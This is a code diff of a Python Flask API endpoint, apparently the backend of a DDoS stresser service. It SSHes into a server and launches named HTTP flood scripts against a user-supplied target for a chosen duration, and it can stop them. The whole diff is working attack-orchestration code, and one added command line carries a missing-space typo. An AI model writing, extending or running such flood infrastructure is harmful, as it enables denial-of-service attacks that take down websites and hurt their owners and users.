@@ -79,4 +79,56 @@ def flood():
         elif method == "HTTP-MIX":
             cmd = f"cd /root/l7/mix && {screen_cmd} node http-mix.js {target} {time} 15"
         elif method == "HTTP-QUERY":
-            cmd = f"cd /root/l7/query && {screen_cmd} node
+            cmd = f"cd /root/l7/query && {screen_cmd} nodehttp-query.js {target} {time} 15"
+        elif method == "STOP":
+            ssh.exec_command(f"pkill -f {screen_name}")
+            ssh.close()
+
+            return jsonify({
+                "response_code": 105,
+                "response_message": f"Stopped flood on {screen_name}."
+            }), 200
+        else:
+            return jsonify({
+                "response_code": 104,
+                "response_message": "Method is not available."
+            }), 400
+
+        ssh_stdin, ssh_stdout, ssh_stderr = ssh.exec_command(cmd)
+        ssh.close()
+
+        return jsonify({
+            "response_code": 105,
+            "response_message": "Flood started.",
+            "time": datetime.datetime.now()
+        }), 200
+
+    except paramiko.BadAuthenticationType:
+        return jsonify({
+            "response_code": 106,
+            "response_message": "Bad authentication type error.",
+        }), 401
+
+    except paramiko.BadHostKeyException:
+        return jsonify({
+            "response_code": 107,
+            "response_message": "Bad Host key error.",
+        }), 403
+
+    except paramiko.PasswordRequiredException:
+        return jsonify({
+            "response_code": 108,
+            "response_message": "PasswordRequired error.",
+        }), 401
+
+    except paramiko.SSHException:
+        return jsonify({
+            "response_code": 109,
+            "response_message": "SSH2  error.",
+        }), 500
+
+    except Exception as e:
+        return jsonify({
+            "response_code": 110,
+            "response_message": f"SSH client uncaught error: {str(e)}",
+        }), 500
